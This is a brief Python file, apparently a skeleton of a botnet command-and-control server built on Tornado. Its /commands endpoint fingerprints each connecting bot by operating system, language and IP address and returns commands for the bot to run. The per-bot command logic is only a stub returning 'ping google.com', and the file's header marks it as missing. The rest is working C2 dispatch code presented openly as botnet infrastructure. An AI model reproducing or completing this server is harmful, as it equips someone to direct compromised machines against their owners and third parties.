'''
    This is a botnet server implementation.

    Missing:
        a) CommandsService.get_commands implementation
'''


import tornado.ioloop
import tornado.web
import tornado.options
from tornado.options import options, define
import httpagentparser
import json
import os


define('debug', default=True, help="debug mode", type=bool)

class CommandsService():
    @staticmethod
    def get_commands(os, primaryLanguage, clientIp):
        return ['ping google.com']


class MainHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        self.render('index.html')


class BotnetCommandsController(tornado.web.RequestHandler):
    def get(self):
        headers = self.request.headers

        os = httpagentparser.detect(headers.get('User-Agent', None))
        primaryLanguage = headers.get('Accept-Language')
        clientIp = self.request.remote_ip

        commands = CommandsService.get_commands(os, primaryLanguage, clientIp)
        self.write(json.dumps(commands, ensure_ascii = False))


class Application(tornado.web.Application):
    """
    """
    def __init__(self):
        handlers = [
            (r"/commands", BotnetCommandsController),
            (r"/.*", MainHandler),
            ]

        settings = dict(
            template_path=os.path.join(os.path.dirname(__file__), "files"),
            static_path=os.path.join(os.path.dirname(__file__), "files"),
            debug=options.debug,
        )

        super(Application, self).__init__(handlers, **settings)


if __name__ == "__main__":
    tornado.options.parse_command_line()
    app = Application()
    app.listen(8080)
    tornado.ioloop.IOLoop.current().start()
